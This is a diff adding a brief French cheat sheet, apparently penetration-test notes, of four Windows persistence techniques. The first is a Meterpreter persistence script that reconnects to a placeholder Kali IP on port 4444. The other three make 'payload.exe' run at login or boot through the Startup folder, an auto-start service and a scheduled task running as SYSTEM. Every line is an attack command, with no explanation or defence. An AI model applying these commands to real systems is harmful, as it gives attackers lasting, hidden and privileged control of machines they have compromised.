@@ -1,0 +1,15 @@
+﻿Méthode 1 :
+run persistence -h
+run persistence -X -i 10 -p 4444 -r <ADRESSE_IP_DE_KALI>
+
+
+Méthode 2 :
+move C:\proc\payload.exe "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
+
+Méthode 3 :
+sc create myservice binpath="C:\proc\payload.exe" start=auto
+
+
+Méthode 4 :
+schtasks /create /RU SYSTEM /SC onstart /TN "mytask" /TR "C:\proc\payload.exe"
